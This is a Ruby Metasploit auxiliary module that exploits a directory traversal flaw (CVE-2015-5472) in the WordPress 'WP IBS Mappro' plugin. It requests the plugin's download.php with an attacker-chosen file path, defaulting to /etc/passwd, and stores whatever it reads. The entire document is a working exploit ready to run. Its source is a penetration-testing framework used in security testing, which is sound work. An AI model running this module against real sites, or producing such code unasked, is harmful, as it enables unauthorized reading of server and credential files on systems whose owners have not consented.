##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress IBS Mappro File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "WP IBS Mappro" version 0.6, allowing to read arbitrary files with the
        web server privileges.
      },
      'References'     =>
        [
          ['CVE', '2015-5472'],
          ['WPVDB', '8091']
        ],
      'Author'         =>
        [
          'Larry W. Cashdollar', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('ibs-mappro', '1.0')
  end

  def run_host(ip)
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\/\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'ibs-mappro', 'lib', 'download.php'),
      'vars_get' =>
        {
          'file' => "#{filename}"
        }
    })

    if res && res.code == 200 && res.body.length > 0

      vprint_status('Downloading file...')
      vprint_line("\n#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'ibsmappro.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try again.")
    end
  end
end
